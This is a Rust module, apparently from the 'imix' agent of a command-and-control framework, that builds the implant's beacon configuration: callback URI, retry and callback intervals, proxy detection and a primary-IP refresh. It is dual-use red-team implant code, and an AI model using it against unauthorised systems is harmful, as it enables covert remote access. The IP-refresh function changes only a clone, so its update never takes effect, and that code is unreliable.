use crate::beacon::build_beacon_info;
use crate::constants::{CALLBACK_INTERVAL, CALLBACK_URI, RETRY_INTERVAL, RUN_ONCE};
use crate::system::{get_primary_ip, get_system_proxy};
use std::collections::HashMap;

/// Re-export Config and ActiveCallback from pb crate
pub use pb::config::{ActiveCallback, Config};

/// Extension trait for Config construction
pub trait ConfigBuilder {
    fn default_with_imix_version(imix_version: &str) -> Self;
    fn refresh_primary_ip(&mut self);
}

impl ConfigBuilder for Config {
    fn default_with_imix_version(imix_version: &str) -> Self {
        let info = build_beacon_info(imix_version);

        // Parse retry and callback intervals with defaults
        let retry_interval = match RETRY_INTERVAL.parse::<u64>() {
            Ok(i) => i,
            Err(_err) => {
                #[cfg(debug_assertions)]
                log::error!("failed to parse retry interval constant, defaulting to 5 seconds: {_err}");
                5_u64
            }
        };

        let callback_interval = match CALLBACK_INTERVAL.parse::<u64>() {
            Ok(i) => i,
            Err(_err) => {
                #[cfg(debug_assertions)]
                log::error!("failed to parse callback interval constant, defaulting to 5 seconds: {_err}");
                5_u64
            }
        };

        // Build transport-specific configuration
        let mut transport_specific = HashMap::new();

        // Add proxy if available from environment (only for GRPC/HTTP transports)
        if let Some(proxy) = get_system_proxy() {
            if CALLBACK_URI.starts_with("grpc://")
                || CALLBACK_URI.starts_with("grpcs://")
                || CALLBACK_URI.starts_with("http://")
                || CALLBACK_URI.starts_with("https://")
                || CALLBACK_URI.starts_with("http1://")
            {
                transport_specific.insert("proxy_uri".to_string(), proxy);
            }
        }

        // Serialize transport_specific to JSON
        let transport_config = serde_json::to_string(&transport_specific)
            .unwrap_or_else(|_| "{}".to_string());

        let active_callback = ActiveCallback {
            retry_interval,
            callback_interval,
            callback_uri: CALLBACK_URI.to_string(),
            transport_config,
        };

        Config {
            info: Some(info),
            active_callback: Some(active_callback),
            run_once: RUN_ONCE,
        }
    }
    fn refresh_primary_ip(&mut self) {
        let fresh_ip = get_primary_ip();
        if self
            .info
            .clone()
            .is_some_and(|b| b.host.as_ref().is_some_and(|h| h.primary_ip != fresh_ip))
        {
            match self.info.clone() {
                Some(mut b) => match b.host.as_mut() {
                    Some(h) => {
                        h.primary_ip = fresh_ip;
                    }
                    None => {
                        #[cfg(debug_assertions)]
                        log::error!("host struct was never initialized, failed to set primary ip");
                    }
                },
                None => {
                    #[cfg(debug_assertions)]
                    log::error!("beacon struct was never initialized, failed to set primary ip");
                }
            }
        }
    }
}
